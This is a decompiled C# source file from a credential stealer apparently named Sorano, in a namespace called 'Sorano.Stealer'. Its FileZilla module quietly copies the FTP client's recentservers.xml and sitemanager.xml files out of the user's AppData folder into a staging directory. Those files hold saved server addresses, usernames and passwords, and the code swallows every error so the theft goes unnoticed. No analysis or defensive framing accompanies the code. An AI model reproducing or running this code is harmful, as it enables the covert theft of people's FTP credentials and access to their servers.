using System;
using System.IO;

namespace Sorano.Stealer
{
	// Token: 0x0200000E RID: 14
	internal class FilezillaFTP
	{
		// Token: 0x0200000F RID: 15
		internal class FileZilla
		{
			// Token: 0x06000022 RID: 34 RVA: 0x00004214 File Offset: 0x00002414
			public static void Initialise(string path)
			{
				bool flag = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml");
				if (!flag)
				{
					try
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", path + "filezilla_recentservers.xml", true);
					}
					catch
					{
					}
					bool flag2 = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml");
					if (!flag2)
					{
						try
						{
							File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", path + "filezilla_sitemanager.xml", true);
						}
						catch
						{
						}
					}
				}
			}
		}
	}
}
